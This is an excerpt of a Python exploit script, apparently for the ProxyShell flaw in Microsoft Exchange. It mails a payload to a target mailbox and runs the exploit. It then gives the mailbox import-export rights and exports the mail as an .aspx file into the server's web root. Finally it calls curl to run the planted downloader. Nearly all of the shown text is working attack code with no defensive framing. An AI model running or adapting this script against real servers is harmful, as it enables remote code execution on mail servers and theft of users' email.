...
def get_args():
    ...
    parser.add_argument('-s', help='SMTP server to use', required=True)
    parser.add_argument('-m', help='Message body', required=True)
    parser.add_argument('-t', help='TLS (yes/no)', required=True)
    parser.add_argument('-a', help='File Attachment', required=True)
    parser.add_argument('-f', help='From Email', required=True)
    parser.add_argument('-n', help='Subject Line', required=True)
    parser.add_argument('-x', help='Initial Payload Name (example.aspx)', required=True)
...
def main():
    ...
    # @goobstersec & @RiiRoman
    # Send email with payload inside
    os.system("sendEmail -m '%s' -t %s -f %s -s %s -u '%s' -o tls=%s -a '%s'" % (args.m, args.e, args.f, args.s, args.n, args.t, args.a))
    exploit(proxyshell)
    start_server(proxyshell, local_port)
    newRoleAssignment = ('New-ManagementRoleAssignment -Role "Mailbox Import Export" -User \'%s\'' % (args.e))
    shell(newRoleAssignment, local_port)
    print("Assigning proper permissions to user")
    print("Sleeping for 3 seconds")
    time.sleep(3)
    shell('Get-MailboxExportRequest | Remove-MailboxExportRequest -Confirm:$false', local_port)
    print("Clearing MailBox Export Requests")
    print("Sleeping for 5 seconds")
    time.sleep(5)
    # Export email to aspx on server
    NewMailExport = ("New-MailboxExportRequest -Mailbox '%s' -ContentFilter \"(Subject -like '%s')\" -FilePath '\\\\127.0.0.1\\C$\\inetpub\\wwwroot\\aspnet_client\\%s'" % (args.e, args.n, args.x))
    shell(NewMailExport, local_port)
    print("Writing payload to disk")
    print("Sleeping for 30 seconds")
    time.sleep(30)
    print("Executing downloader")
    os.system("curl https://%s/aspnet_client/%s -k" % (args.u, args.x))
    print("Downloader executed.\nFile will be located in: https://%s/aspnet_client/" % (args.u))
